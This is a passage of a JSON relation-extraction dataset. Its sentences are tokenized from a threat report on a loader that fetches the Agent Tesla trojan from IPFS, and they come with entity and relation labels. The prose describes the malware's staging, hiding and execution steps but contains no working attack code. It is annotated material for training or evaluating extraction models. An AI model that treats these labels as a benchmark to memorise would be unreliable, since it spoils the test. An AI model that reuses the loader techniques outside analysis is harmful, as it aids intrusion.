10}, {"r": "CO", "evidence": [3], "h": 11, "t": 12}, {"r": "CO", "evidence": [3], "h": 11, "t": 13}, {"r": "RD", "evidence": [2, 3, 4], "t": 9, "h": 14}, {"r": "ST", "evidence": [4], "h": 14, "t": 16}, {"r": "RF", "evidence": [4], "h": 14, "t": 16}, {"r": "RD", "evidence": [2, 3, 4], "t": 9, "h": 15}, {"r": "ST", "evidence": [4], "h": 15, "t": 16}, {"r": "RF", "evidence": [4], "h": 15, "t": 16}, {"r": "ST", "evidence": [4], "h": 15, "t": 16}, {"r": "RF", "evidence": [4], "h": 15, "t": 16}, {"r": "ST", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "RF", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "ST", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "RF", "evidence": [4, 5], "t": 16, "h": 17}, {"r": "RD", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "RD", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "WR", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "CO", "evidence": [5, 6], "h": 17, "t": 18}, {"r": "RD", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 18, "t": 19}, {"r": "CO", "evidence": [6, 7], "h": 18, "t": 20}, {"r": "RD", "evidence": [7], "h": 20, "t": 21}, {"r": "ST", "evidence": [7], "h": 20, "t": 22}, {"r": "RF", "evidence": [7], "h": 20, "t": 22}]}, {"title": "002-3", "sents": [["The", "data", "consists", "of", "an", "obfuscated", "PE32", "executable", "that", "functions", "as", "the", "next-stage", "payload", "."], ["The", "downloader", "stores", "each", "byte", "of", "this", "data", "retrieved", "from", "the", "IPFS", "gateway", "in", "an", "array", "and", "uses", "a", "key", "value", "stored", "in", "the", "executable", "to", "convert", "the", "byte", "array", "into", "the", "next-stage", "PE32", "."], ["This", "new", "payload", "is", "reflectively", "loaded", "and", "executed", ",", "initiating", "the", "remote", "access", "trojan", "(", "RAT", ")", "called", "Agent", "Tesla", "."], ["In", "all", "three", "clusters", ",", "the", "initial", "payload", "served", "as", "a", "loader", "and", "operated", "similarly", ",", "but", "the", "final", "payload", "hosted", "on", "the", "IPFS", "network", "was", "different", "for", "each", "cluster", "."], ["Most", "loaders", "were", "not", "packed", ",", "but", "some", "samples", "were", "observed", "to", "be", "packed", "using", "UPX", "."], ["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", ",", "using", "a", "command", "line", "syntax", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "Network", "."], ["The", "malware", "then", "attempts", "to", "download", "Python", "3.10", "from", "the", "software", "provider", "using", "the", "cURL", "command", "."], ["Once", "the", "ZIP", "archive", "has", "been", "retrieved", ",", "it", "is", "unzipped", "and", "stored", "in", "the", "previously", "created", "directory", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "data", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "PE32 executable", "pos": [6, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [16, 16], "name": "downloader", "pos": [1, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [22, 22], "name": "data", "pos": [7, 8], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [26, 26], "name": "IPFS gateway", "pos": [11, 13], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "executable", "pos": [24, 25], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [48, 48], "name": "PE32", "pos": [33, 34], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [52, 52], "name": "payload", "pos": [2, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [61, 61], "name": "remote access trojan", "pos": [11, 14], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [65, 65], "name": "RAT", "pos": [15, 16], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [68, 68], "name": "Agent Tesla", "pos": [18, 20], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [77, 77], "name": "initial payload", "pos": [6, 8], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [89, 89], "name": "final payload", "pos": [18, 20], "index": "12_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [94, 94], "name": "IPFS network", "pos": [23, 25], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [103, 103], "name": "loaders", "pos": [1, 2], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [123, 123], "name": "loader", "pos": [4, 5], "index": "15_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [130, 130], "name": "% APPDATA %", "pos": [11, 14], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [155, 155], "name": "malware", "pos": [1, 2], "index": "17_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [160, 160], "name": "Python 3.10", "pos": [6, 8], "index": "18_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [164, 164], "name": "software provider", "pos": [10, 12], "index": "19_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [173, 173], "name": "ZIP archive", "pos": [2, 4], "index": "20_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [179, 179], "name": "it", "pos": [8, 9], "index": "21_0"}]], "labels": [{"r": "RD", "evidence": [1], "h": 2, "t": 3}, {"r": "ST", "evidence": [1], "h": 2, "t": 4}, {"r": "RF", "evidence": [1], "h": 2, "t": 4}, {"r": "WR", "evidence": [1], "h": 2, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 6, "t": 7}, {"r": "CO", "evidence": [2], "h": 8, "t": 9}, {"r": "CO", "evidence": [2], "h": 8, "t": 10}, {"r": "RD", "evidence": [1, 2, 3], "t": 6, "h": 11}, {"r": "ST", "evidence": [3], "h": 11, "t": 13}, {"r": "RF", "evidence": [3], "h": 11, "t": 13}, {"r": "RD", "evidence": [1, 2, 3], "t": 6, "h": 12}, {"r": "ST", "evidence": [3], "h": 12, "t": 13}, {"r": "RF", "evidence": [3], "h": 12, "t": 13}, {"r": "ST", "evidence": [3], "h": 12, "t": 13}, {"r": "RF", "evidence": [3], "h": 12, "t": 13}, {"r": "ST", "evidence": [3, 4], "t": 13, "h": 14}, {"r": "RF", "evidence": [3, 4], "t": 13, "h": 14}, {"r": "ST", "evidence": [3, 4], "t": 13, "h": 14}, {"r": "RF", "evidence": [3, 4], "t": 13, "h": 14}, {"r": "RD", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "RD", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "CO", "evidence": [4, 5], "h": 14, "t": 15}, {"r": "RD", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [5], "h": 15, "t": 16}, {"r": "CO", "evidence": [5, 6], "h": 15, "t": 17}, {"r": "RD", "evidence": [6], "h": 17, "t": 18}, {"r": "ST", "evidence": [6], "h": 17, "t": 19}, {"r": "RF", "evidence": [6], "h": 17, "t": 19}, {"r": "RD", "evidence": [6, 7], "h": 17, "t": 20}, {"r": "CO", "evidence": [6, 7], "h": 18, "t": 20}, {"r": "CO", "evidence": [6, 7], "h": 18, "t": 21}]}, {"title": "002-4", "sents": [["The", "downloader", "stores", "each", "byte", "of", "this", "data", "retrieved", "from", "the", "IPFS", "gateway", "in", "an", "array", "and", "uses", "a", "key", "value", "stored", "in", "the", "executable", "to", "convert", "the", "byte", "array", "into", "the", "next-stage", "PE32", "."], ["This", "new", "payload", "is", "reflectively", "loaded", "and", "executed", ",", "initiating", "the", "remote", "access", "trojan", "(", "RAT", ")", "called", "Agent", "Tesla", "."], ["In", "all", "three", "clusters", ",", "the", "initial", "payload", "served", "as", "a", "loader", "and", "operated", "similarly", ",", "but", "the", "final", "payload", "hosted", "on", "the", "IPFS", "network", "was", "different", "for", "each", "cluster", "."], ["Most", "loaders", "were", "not", "packed", ",", "but", "some", "samples", "were", "observed", "to", "be", "packed", "using", "UPX", "."], ["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", ",", "using", "a", "command", "line", "syntax", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "Network", "."], ["The", "malware", "then", "attempts", "to", "download", "Python", "3.10", "from", "the", "software", "provider", "using", "the", "cURL", "command", "."], ["Once", "the", "ZIP", "archive", "has", "been", "retrieved", ",", "it", "is", "unzipped", "and", "stored", "in", "the", "previously", "created", "directory", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."], ["The", "malware", "also", "retrieves", "the", "final", "payload", "in", "the", "infection", "chain", "and", "stores", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "downloader", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "data", "pos": [7, 8], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [11, 11], "name": "IPFS gateway", "pos": [11, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [24, 24], "name": "executable", "pos": [24, 25], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [33, 33], "name": "PE32", "pos": [33, 34], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "payload", "pos": [2, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [46, 46], "name": "remote access trojan", "pos": [11, 14], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [50, 50], "name": "RAT", "pos": [15, 16], "index": "7_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [53, 53], "name": "Agent Tesla", "pos": [18, 20], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [62, 62], "name": "initial payload", "pos": [6, 8], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [74, 74], "name": "final payload", "pos": [18, 20], "index": "10_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [79, 79], "name": "IPFS network", "pos": [23, 25], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [88, 88], "name": "loaders", "pos": [1, 2], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [108, 108], "name": "loader", "pos": [4, 5], "index": "13_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [115, 115], "name": "% APPDATA %", "pos": [11, 14], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [140, 140], "name": "malware", "pos": [1, 2], "index": "15_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [145, 145], "name": "Python 3.10", "pos": [6, 8], "index": "16_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [149, 149], "name": "software provider", "pos": [10, 12], "index": "17_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [158, 158], "name": "ZIP archive", "pos": [2, 4], "index": "18_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [164, 164], "name": "it", "pos": [8, 9], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [183, 183], "name": "malware", "pos": [1, 2], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [187, 187], "name": "final payload", "pos": [5, 7], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [195, 195], "name": "it", "pos": [13, 14], "index": "22_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 4, "t": 5}, {"r": "CO", "evidence": [1], "h": 6, "t": 7}, {"r": "CO", "evidence": [1], "h": 6, "t": 8}, {"r": "RD", "evidence": [0, 1, 2], "t": 4, "h": 9}, {"r": "ST", "evidence": [2], "h": 9, "t": 11}, {"r": "RF", "evidence": [2], "h": 9, "t": 11}, {"r": "RD", "evidence": [0, 1, 2], "t": 4, "h": 10}, {"r": "ST", "evidence": [2], "h": 10, "t": 11}, {"r": "RF", "evidence": [2], "h": 10, "t": 11}, {"r": "ST", "evidence": [2], "h": 10, "t": 11}, {"r": "RF", "evidence": [2], "h": 10, "t": 11}, {"r": "ST", "evidence": [2, 3], "t": 11, "h": 12}, {"r": "RF", "evidence": [2, 3], "t": 11, "h": 12}, {"r": "ST", "evidence": [2, 3], "t": 11, "h": 12}, {"r": "RF", "evidence": [2, 3], "t": 11, "h": 12}, {"r": "RD", "evidence": [3, 4], "h": 12, "t": 14}, {"r": "RD", "evidence": [3, 4], "h": 12, "t": 14}, {"r": "WR", "evidence": [3, 4], "h": 12, "t": 14}, {"r": "CO", "evidence": [3, 4], "h": 12, "t": 13}, {"r": "RD", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": "CO", "evidence": [4, 5], "h": 13, "t": 15}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 13, "t": 20}, {"r": "RD", "evidence": [5], "h": 15, "t": 16}, {"r": "ST", "evidence": [5], "h": 15, "t": 17}, {"r": "RF", "evidence": [5], "h": 15, "t": 17}, {"r": "RD", "evidence": [5, 6], "h": 15, "t": 18}, {"r": "CO", "evidence": [5, 6], "h": 16, "t": 18}, {"r": "CO", "evidence": [5, 6], "h": 16, "t": 19}, {"r": "RD", "evidence": [7], "h": 20, "t": 21}, {"r": "CO", "evidence": [7], "h": 21, "t": 22}]}, {"title": "002-5", "sents": [["This", "new", "payload", "is", "reflectively", "loaded", "and", "executed", ",", "initiating", "the", "remote", "access", "trojan", "(", "RAT", ")", "called", "Agent", "Tesla", "."], ["In", "all", "three", "clusters", ",", "the", "initial", "payload", "served", "as", "a", "loader", "and", "operated", "similarly", ",", "but", "the", "final", "payload", "hosted", "on", "the", "IPFS", "network", "was", "different", "for", "each", "cluster", "."], ["Most", "loaders", "were", "not", "packed", ",", "but", "some", "samples", "were", "observed", "to", "be", "packed", "using", "UPX", "."], ["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", ",", "using", "a", "command", "line", "syntax", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "Network", "."], ["The", "malware", "then", "attempts", "to", "download", "Python", "3.10", "from", "the", "software", "provider", "using", "the", "cURL", "command", "."], ["Once", "the", "ZIP", "archive", "has", "been", "retrieved", ",", "it", "is", "unzipped", "and", "stored", "in", "the", "previously", "created", "directory", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."], ["The", "malware", "also", "retrieves", "the", "final", "payload", "in", "the", "infection", "chain", "and", "stores", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."], ["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", ",", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "payload", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [11, 11], "name": "remote access trojan", "pos": [11, 14], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "RAT", "pos": [15, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [18, 18], "name": "Agent Tesla", "pos": [18, 20], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "initial payload", "pos": [6, 8], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [39, 39], "name": "final payload", "pos": [18, 20], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [44, 44], "name": "IPFS network", "pos": [23, 25], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [53, 53], "name": "loaders", "pos": [1, 2], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [73, 73], "name": "loader", "pos": [4, 5], "index": "8_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [80, 80], "name": "% APPDATA %", "pos": [11, 14], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [105, 105], "name": "malware", "pos": [1, 2], "index": "10_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [110, 110], "name": "Python 3.10", "pos": [6, 8], "index": "11_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [114, 114], "name": "software provider", "pos": [10, 12], "index": "12_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [123, 123], "name": "ZIP archive", "pos": [2, 4], "index": "13_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [129, 129], "name": "it", "pos": [8, 9], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [148, 148], "name": "malware", "pos": [1, 2], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [152, 152], "name": "final payload", "pos": [5, 7], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [160, 160], "name": "it", "pos": [13, 14], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [173, 173], "name": "loader", "pos": [1, 2], "index": "18_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [177, 177], "name": "attrib.exe", "pos": [5, 6], "index": "19_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [196, 196], "name": "Python ZIP archive", "pos": [24, 27], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [200, 200], "name": "final payload", "pos": [28, 30], "index": "21_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0], "h": 1, "t": 3}, {"r": "ST", "evidence": [1], "h": 4, "t": 6}, {"r": "RF", "evidence": [1], "h": 4, "t": 6}, {"r": "ST", "evidence": [1], "h": 5, "t": 6}, {"r": "RF", "evidence": [1], "h": 5, "t": 6}, {"r": "ST", "evidence": [1], "h": 5, "t": 6}, {"r": "RF", "evidence": [1], "h": 5, "t": 6}, {"r": "ST", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "RF", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "ST", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "RF", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "RD", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "RD", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "WR", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "RD", "evidence": [3], "h": 8, "t": 9}, {"r": "WR", "evidence": [3], "h": 8, "t": 9}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 10}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 8, "t": 15}, {"r": "CO", "evidence": [3, 4, 5, 6, 7], "h": 8, "t": 18}, {"r": "RD", "evidence": [4], "h": 10, "t": 11}, {"r": "ST", "evidence": [4], "h": 10, "t": 12}, {"r": "RF", "evidence": [4], "h": 10, "t": 12}, {"r": "RD", "evidence": [4, 5], "h": 10, "t": 13}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 13}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 14}, {"r": "RD", "evidence": [6], "h": 15, "t": 16}, {"r": "CO", "evidence": [6], "h": 16, "t": 17}, {"r": "FR", "evidence": [7], "h": 18, "t": 19}, {"r": "CD", "evidence": [7], "h": 19, "t": 20}, {"r": "CD", "evidence": [7], "h": 19, "t": 21}]}, {"title": "002-6", "sents": [["In", "all", "three", "clusters", ",", "the", "initial", "payload", "served", "as", "a", "loader", "and", "operated", "similarly", ",", "but", "the", "final", "payload", "hosted", "on", "the", "IPFS", "network", "was", "different", "for", "each", "cluster", "."], ["Most", "loaders", "were", "not", "packed", ",", "but", "some", "samples", "were", "observed", "to", "be", "packed", "using", "UPX", "."], ["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", ",", "using", "a", "command", "line", "syntax", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "Network", "."], ["The", "malware", "then", "attempts", "to", "download", "Python", "3.10", "from", "the", "software", "provider", "using", "the", "cURL", "command", "."], ["Once", "the", "ZIP", "archive", "has", "been", "retrieved", ",", "it", "is", "unzipped", "and", "stored", "in", "the", "previously", "created", "directory", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."], ["The", "malware", "also", "retrieves", "the", "final", "payload", "in", "the", "infection", "chain", "and", "stores", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."], ["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", ",", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."], ["Finally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "initial payload", "pos": [6, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [18, 18], "name": "final payload", "pos": [18, 20], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [23, 23], "name": "IPFS network", "pos": [23, 25], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "loaders", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [52, 52], "name": "loader", "pos": [4, 5], "index": "4_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [59, 59], "name": "% APPDATA %", "pos": [11, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [84, 84], "name": "malware", "pos": [1, 2], "index": "6_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [89, 89], "name": "Python 3.10", "pos": [6, 8], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [93, 93], "name": "software provider", "pos": [10, 12], "index": "8_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [102, 102], "name": "ZIP archive", "pos": [2, 4], "index": "9_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [108, 108], "name": "it", "pos": [8, 9], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [127, 127], "name": "malware", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [131, 131], "name": "final payload", "pos": [5, 7], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [139, 139], "name": "it", "pos": [13, 14], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [152, 152], "name": "loader", "pos": [1, 2], "index": "14_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [156, 156], "name": "attrib.exe", "pos": [5, 6], "index": "15_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [175, 175], "name": "Python ZIP archive", "pos": [24, 27], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [179, 179], "name": "final payload", "pos": [28, 30], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [188, 188], "name": "loader", "pos": [3, 4], "index": "18_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [193, 193], "name": "Python executable", "pos": [8, 10], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [198, 198], "name": "final payload", "pos": [13, 15], "index": "20_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [0], "h": 1, "t": 2}, {"r": "RF", "evidence": [0], "h": 1, "t": 2}, {"r": "ST", "evidence": [0], "h": 1, "t": 2}, {"r": "RF", "evidence": [0], "h": 1, "t": 2}, {"r": "ST", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "RF", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "ST", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "RF", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "RD", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 4, "t": 11}, {"r": "CO", "evidence": [2, 3, 4, 5, 6], "h": 4, "t": 14}, {"r": "CO", "evidence": [2, 3, 4, 5, 6, 7], "h": 4, "t": 18}, {"r": "RD", "evidence": [3], "h": 6, "t": 7}, {"r": "ST", "evidence": [3], "h": 6, "t": 8}, {"r": "RF", "evidence": [3], "h": 6, "t": 8}, {"r": "RD", "evidence": [3, 4], "h": 6, "t": 9}, {"r": "CO", "evidence": [3, 4], "h": 7, "t": 9}, {"r": "CO", "evidence": [3, 4], "h": 7, "t": 10}, {"r": "RD", "evidence": [5], "h": 11, "t": 12}, {"r": "CO", "evidence": [5], "h": 12, "t": 13}, {"r": "FR", "evidence": [6], "h": 14, "t": 15}, {"r": "CD", "evidence": [6], "h": 15, "t": 16}, {"r": "CD", "evidence": [6], "h": 15, "t": 17}, {"r": "FR", "evidence": [7], "h": 18, "t": 19}, {"r": "EX", "evidence": [6, 7], "t": 16, "h": 19}, {"r": "RD", "evidence": [7], "h": 19, "t": 20}]}, {"title": "002-7", "sents": [["Most", "loaders", "were", "not", "packed", ",", "but", "some", "samples", "were", "observed", "to", "be", "packed", "using", "UPX", "."], ["When", "executed", ",", "the", "loader", "first", "creates", "a", "directory", "structure", "within", "%", "APPDATA", "%", ",", "using", "a", "command", "line", "syntax", ":", "C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft", "&", "&", "mkdir", "Network", "."], ["The", "malware", "then", "attempts", "to", "download", "Python", "3.10", "from", "the", "software", "provider", "using", "the", "cURL", "command", "."], ["Once", "the", "ZIP", "archive", "has", "been", "retrieved", ",", "it", "is", "unzipped", "and", "stored", "in", "the", "previously", "created", "directory", "using", "the", "PowerShell", "``", "Expand-Archive", "''", "cmdlet", "."], ["The", "malware", "also", "retrieves", "the", "final", "payload", "in", "the", "infection", "chain", "and", "stores", "it", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Packages.txt", "''", "."], ["The", "loader", "then", "uses", "the", "attrib.exe", "utility", "to", "set", "the", "System", "and", "Hidden", "flags", "on", "the", "previously", "created", "directory", ",", "as", "well", "as", "the", "Python", "ZIP", "archive", "and", "final", "payload", "that", "was", "retrieved", "."], ["Finally", ",", "the", "loader", "invokes", "the", "newly", "downloaded", "Python", "executable", "and", "passes", "the", "final", "payload", "as", "a", "command", "line", "argument", ",", "executing", "the", "next", "stage", "of", "the", "infection", "process", "."], ["In", "some", "cases", ",", "the", "malware", "achieves", "persistence", "by", "adding", "entries", "into", "the", "Windows", "registry", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "loaders", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "loader", "pos": [4, 5], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [28, 28], "name": "% APPDATA %", "pos": [11, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [53, 53], "name": "malware", "pos": [1, 2], "index": "3_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [58, 58], "name": "Python 3.10", "pos": [6, 8], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [62, 62], "name": "software provider", "pos": [10, 12], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [71, 71], "name": "ZIP archive", "pos": [2, 4], "index": "6_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [77, 77], "name": "it", "pos": [8, 9], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [96, 96], "name": "malware", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [100, 100], "name": "final payload", "pos": [5, 7], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [108, 108], "name": "it", "pos": [13, 14], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [121, 121], "name": "loader", "pos": [1, 2], "index": "11_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [125, 125], "name": "attrib.exe", "pos": [5, 6], "index": "12_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [144, 144], "name": "Python ZIP archive", "pos": [24, 27], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [148, 148], "name": "final payload", "pos": [28, 30], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [157, 157], "name": "loader", "pos": [3, 4], "index": "15_0"}], [{"type": 